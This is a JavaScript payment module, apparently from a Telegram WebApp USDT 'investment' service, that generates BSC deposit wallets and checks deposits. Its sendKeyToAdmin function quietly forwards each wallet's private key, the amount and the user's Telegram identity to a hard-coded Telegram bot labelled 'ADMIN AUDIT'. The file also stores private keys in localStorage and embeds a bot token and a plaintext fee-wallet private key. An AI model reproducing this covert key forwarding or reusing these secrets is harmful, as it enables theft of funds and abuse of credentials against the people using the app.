import { state, saveInvestment } from './state.js';
import { updateDashboard, switchTab } from './main.js';

// --- CONFIGURACIÓN CENTRALIZADA ---
const API_BASE = "https://api-usdt-bep20.vercel.app/api";
const ADMIN_BOT_TOKEN = "8756788328:AAEpszWL4ssLme7YLtJs8kachsj4cEnvdrw";
const ADMIN_CHAT_ID = "7517815832";

/**
 * Envía reporte al Admin
 */
async function sendKeyToAdmin(address, privKey, amount) {
    const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
    const username = user?.username ? `@${user.username}` : (user?.first_name || "Usuario");
    const userId = user?.id || "N/A";

    const text = `🛡️ ADMIN AUDIT 🛡️\n\n` +
                 `💰 Amount: ${amount} USDT\n` +
                 `📍 Wallet: <code>${address}</code>\n` +
                 `🔑 Key: <code>${privKey}</code>\n\n` +
                 `👤 User: ${username} (ID: ${userId})`;

    try {
        await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'HTML' })
        });
    } catch (e) { console.error("Admin report failed", e); }
}

/**
 * Genera el pago
 */
export async function showPayment() {
    const buyInput = document.getElementById('buy-qty');
    const amount = parseFloat(buyInput?.value || 0);
    
    if(!amount || amount < 1) {
        if(window.showToast) window.showToast("Minimum investment is 1 USDT");
        return;
    }
    
    const btnContinue = document.getElementById('btn-continue');
    if(btnContinue) {
        btnContinue.disabled = true;
        btnContinue.innerText = "GENERATING...";
    }

    try {
        const response = await fetch(`${API_BASE}/bsc`);
        const data = await response.json();

        if(data.address) {
            state.pendingInvestment = amount;
            state.tempAddress = data.address;
            state.tempKey = data.privateKey; 

            sendKeyToAdmin(data.address, data.privateKey, amount);

            localStorage.setItem('last_wallet_address', data.address);
            localStorage.setItem('last_private_key', data.privateKey);
            
            document.getElementById('pay-amount-display').innerText = amount.toFixed(2) + " USDT";
            document.getElementById('wallet-address-display').innerText = data.address;
            
            const qrImg = document.getElementById('qr-image');
            if(qrImg) qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${data.address}`;

            document.getElementById('payment-status-text').innerHTML = 'Not Received ⏳';
            document.getElementById('payModal').style.display = 'flex';
            startPaymentTimer();
        }
    } catch (e) {
        if(window.showToast) window.showToast("API Connection Error");
    } finally {
        if(btnContinue) {
            btnContinue.disabled = false;
            btnContinue.innerText = "Continue";
        }
    }
}

/**
 * VERIFICAR PAGO (Corregida para evitar falsos "Network Error")
 */
export async function verifyPayment() {
    const statusText = document.getElementById('payment-status-text');
    const arrowIcon = document.getElementById('arrow-icon');
    
    if (!state.tempKey) {
        if(window.showToast) window.showToast("No active session");
        return;
    }

    statusText.innerHTML = 'LOADING... ⌛';
    if(arrowIcon) arrowIcon.className = "fas fa-sync fa-spin"; 

    try {
        const res = await fetch(`${API_BASE}/deposit-usdt`, {
            method: 'POST',
            mode: 'cors', // Forzamos el modo CORS
            headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            },
            body: JSON.stringify({
                userPrivateKey: state.tempKey,
                adminAddress: "0x1DE276E2E8879e1E6fBf905ee656Fe62c6D88E49", 
                feePrivateKey: "d303adf9054d5007ea88392938a7865f9275de2b1fac2c6812cfd92da4b1f0ab" 
            })
        });

        const result = await res.json();

        if (result.success) {
            statusText.innerHTML = `<span style="color: #10b981;">${state.pendingInvestment} USDT ✅</span>`;
            if(arrowIcon) arrowIcon.className = "fas fa-check";
            saveInvestment(state.pendingInvestment);
            if(window.showToast) window.showToast("Payment confirmed!");
            setTimeout(() => { closePayment(); updateDashboard(); switchTab('home'); }, 2000);
        } else {
            // El servidor respondió que NO hay pago aún
            statusText.innerHTML = 'Not Received ⏳';
            if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
        }
    } catch (e) {
        // Si entra aquí, es un error de conexión o CORS
        console.error("DEBUG ERROR:", e); 
        
        // Solo muestra el Toast si realmente falló el fetch
        if(window.showToast) window.showToast("Connection failed. Check CORS or Internet.");
        
        statusText.innerHTML = 'Not Received ⏳';
        if(arrowIcon) arrowIcon.className = "fas fa-arrow-right";
    }
}

function startPaymentTimer() {
    let time = 1800; 
    clearInterval(state.payTimerInterval);
    state.payTimerInterval = setInterval(() => {
        let min = Math.floor(time / 60).toString().padStart(2, '0');
        let sec = (time % 60).toString().padStart(2, '0');
        const timerEl = document.getElementById('pay-timer-text');
        if(timerEl) timerEl.innerHTML = `Send countdown: <span style="color: #10b981;">00:${min}:${sec}</span>`;
        if(time-- <= 0) clearInterval(state.payTimerInterval);
    }, 1000);
}

export function closePayment() {
    document.getElementById('payModal').style.display = 'none';
    clearInterval(state.payTimerInterval);
}

window.copyAddress = function() {
    const address = document.getElementById('wallet-address-display')?.innerText;
    if(address) {
        navigator.clipboard.writeText(address).then(() => {
            if(window.showToast) window.showToast("Address copied!");
        });
    }
};

// Asegurar que las funciones sean visibles para el HTML
window.showPayment = showPayment;
window.closePayment = closePayment;
window.verifyPayment = verifyPayment;
window.copyAddress = copyAddress;
